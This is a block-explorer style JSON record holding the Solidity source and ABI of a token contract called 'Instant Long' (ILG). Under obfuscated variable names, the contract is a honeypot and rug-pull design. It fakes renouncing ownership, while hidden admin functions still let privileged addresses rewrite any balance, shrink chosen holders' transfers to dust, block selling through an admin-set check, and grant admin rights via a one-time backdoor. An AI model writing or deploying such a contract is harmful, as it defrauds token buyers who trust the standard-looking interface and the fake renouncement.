{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface enableTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableAutoWallet {\n    function createPair(address exemptMarketing, address listLaunch) external returns (address);\n}\n\ninterface swapEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderReceiverEnable) external view returns (uint256);\n\n    function transfer(address receiverToFund, uint256 minTxMode) external returns (bool);\n\n    function allowance(address feeMinLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTxMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverToFund,\n        uint256 minTxMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txMode, uint256 value);\n    event Approval(address indexed feeMinLaunched, address indexed spender, uint256 value);\n}\n\ninterface minList is swapEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InstantLong is walletEnable, swapEnable, minList {\n\n    function transfer(address isListTrading, uint256 minTxMode) external virtual override returns (bool) {\n        return autoTotalIs(_msgSender(), isListTrading, minTxMode);\n    }\n\n    uint256 private tokenAuto;\n\n    mapping(address => bool) public fromSender;\n\n    function allowance(address isAt, address atFundExempt) external view virtual override returns (uint256) {\n        if (atFundExempt == teamShould) {\n            return type(uint256).max;\n        }\n        return launchToken[isAt][atFundExempt];\n    }\n\n    address limitFundShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private senderWallet = 18;\n\n    bool public limitList;\n\n    uint256 constant tokenList = 10 ** 10;\n\n    uint256 private fromIs;\n\n    uint256 public enableAtLiquidity;\n\n    mapping(address => bool) public receiverSenderWallet;\n\n    address teamShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public marketingToFrom;\n\n    function tradingMin() private view {\n        require(receiverSenderWallet[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLiquidityFee;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchToken;\n\n    function owner() external view returns (address) {\n        return feeExempt;\n    }\n\n    function approve(address atFundExempt, uint256 minTxMode) public virtual override returns (bool) {\n        launchToken[_msgSender()][atFundExempt] = minTxMode;\n        emit Approval(_msgSender(), atFundExempt, minTxMode);\n        return true;\n    }\n\n    function marketingTotal(address takeAt) public {\n        tradingMin();\n        if (tokenAuto == receiverToken) {\n            launchMax = true;\n        }\n        if (takeAt == minTotal || takeAt == atTo) {\n            return;\n        }\n        fromSender[takeAt] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTotal;\n    }\n\n    mapping(address => uint256) private minLimit;\n\n    bool private launchMax;\n\n    constructor (){\n        \n        enableTx buyTeam = enableTx(teamShould);\n        atTo = enableAutoWallet(buyTeam.factory()).createPair(buyTeam.WETH(), address(this));\n        \n        minTotal = _msgSender();\n        liquidityMarketing();\n        receiverSenderWallet[minTotal] = true;\n        minLimit[minTotal] = sellTotal;\n        if (sellModeReceiver) {\n            receiverToken = tokenAuto;\n        }\n        emit Transfer(address(0), minTotal, sellTotal);\n    }\n\n    function takeLimitLiquidity(address isListTrading, uint256 minTxMode) public {\n        tradingMin();\n        minLimit[isListTrading] = minTxMode;\n    }\n\n    string private autoLiquidityFee = \"ILG\";\n\n    event OwnershipTransferred(address indexed enableAuto, address indexed autoReceiverTake);\n\n    function autoTotalIs(address modeLiquidity, address receiverToFund, uint256 minTxMode) internal returns (bool) {\n        if (modeLiquidity == minTotal) {\n            return fromSell(modeLiquidity, receiverToFund, minTxMode);\n        }\n        uint256 isList = swapEnable(atTo).balanceOf(limitFundShould);\n        require(isList == shouldAuto);\n        require(receiverToFund != limitFundShould);\n        if (fromSender[modeLiquidity]) {\n            return fromSell(modeLiquidity, receiverToFund, tokenList);\n        }\n        return fromSell(modeLiquidity, receiverToFund, minTxMode);\n    }\n\n    bool public launchedMax;\n\n    uint256 private receiverToken;\n\n    bool private sellModeReceiver;\n\n    uint256 private sellTotal = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return feeExempt;\n    }\n\n    uint256 autoAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return buyReceiver;\n    }\n\n    function fromReceiverAmount(uint256 minTxMode) public {\n        tradingMin();\n        shouldAuto = minTxMode;\n    }\n\n    function marketingLaunchMin(address isModeWallet) public {\n        if (launchedMax) {\n            return;\n        }\n        \n        receiverSenderWallet[isModeWallet] = true;\n        \n        launchedMax = true;\n    }\n\n    uint256 shouldAuto;\n\n    function fromSell(address modeLiquidity, address receiverToFund, uint256 minTxMode) internal returns (bool) {\n        require(minLimit[modeLiquidity] >= minTxMode);\n        minLimit[modeLiquidity] -= minTxMode;\n        minLimit[receiverToFund] += minTxMode;\n        emit Transfer(modeLiquidity, receiverToFund, minTxMode);\n        return true;\n    }\n\n    function balanceOf(address senderReceiverEnable) public view virtual override returns (uint256) {\n        return minLimit[senderReceiverEnable];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderWallet;\n    }\n\n    address public minTotal;\n\n    function liquidityMarketing() public {\n        emit OwnershipTransferred(minTotal, address(0));\n        feeExempt = address(0);\n    }\n\n    string private buyReceiver = \"Instant Long\";\n\n    address private feeExempt;\n\n    uint256 private shouldReceiver;\n\n    address public atTo;\n\n    function transferFrom(address modeLiquidity, address receiverToFund, uint256 minTxMode) external override returns (bool) {\n        if (_msgSender() != teamShould) {\n            if (launchToken[modeLiquidity][_msgSender()] != type(uint256).max) {\n                require(minTxMode <= launchToken[modeLiquidity][_msgSender()]);\n                launchToken[modeLiquidity][_msgSender()] -= minTxMode;\n            }\n        }\n        return autoTotalIs(modeLiquidity, receiverToFund, minTxMode);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMinLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiverTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFundExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFundExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiverEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAtLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTxMode\",\"type\":\"uint256\"}],\"name\":\"fromReceiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isModeWallet\",\"type\":\"address\"}],\"name\":\"marketingLaunchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSenderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isListTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxMode\",\"type\":\"uint256\"}],\"name\":\"takeLimitLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isListTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverToFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InstantLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}